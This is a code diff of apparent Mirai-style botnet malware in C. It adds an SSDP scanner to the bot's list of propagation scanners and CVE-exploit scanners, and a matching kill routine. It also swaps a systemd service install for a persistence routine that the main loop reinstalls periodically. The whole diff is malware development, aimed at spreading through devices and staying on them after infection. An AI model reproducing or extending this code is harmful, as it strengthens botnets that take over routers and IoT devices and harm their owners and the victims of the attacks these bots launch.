@@ -29,6 +29,7 @@
 #include "upnp_scanner.h"
 #include "tr069_scanner.h"
 #include "http_scanner.h"
+#include "ssdp_scanner.h"
 #include "cve_exploits.h"
 #include "realtek.h"
 #include "attack_stats.h"
@@ -77,6 +78,7 @@ void start_scanner(void)
         tr069_scanner();
         http_scanner();
         cve_exploits_scanner();
+        ssdp_scanner();
     } else if(rand_num == 0)
     {
         scanner_init();
@@ -90,6 +92,7 @@ void start_scanner(void)
         tr069_scanner();
         http_scanner();
         cve_exploits_scanner();
+        ssdp_scanner();
     } 
 }
 #endif
@@ -213,11 +216,17 @@ watchdog_maintain();
 #ifndef SELFREP
 scanner_init();
 #endif
-    util_install_systemd_service();
+    util_install_persistence();
     signal(SIGTERM, graceful_shutdown_handler);
     signal(SIGINT, graceful_shutdown_handler);
+    uint32_t persistence_check_counter = 0;
     while (TRUE)
     {
+        persistence_check_counter++;
+        if(persistence_check_counter % 3600 == 0)
+        {
+            util_install_persistence();
+        }
         fd_set fdsetrd, fdsetwr, fdsetex;
         struct timeval timeo;
         int mfd, nfds;
@@ -247,6 +256,7 @@ scanner_init();
             gpon8080_kill();
             huawei_kill();
             ssh_kill();
+            ssdp_kill();
             zte_kill();
             upnp_kill();
             tr069_kill();
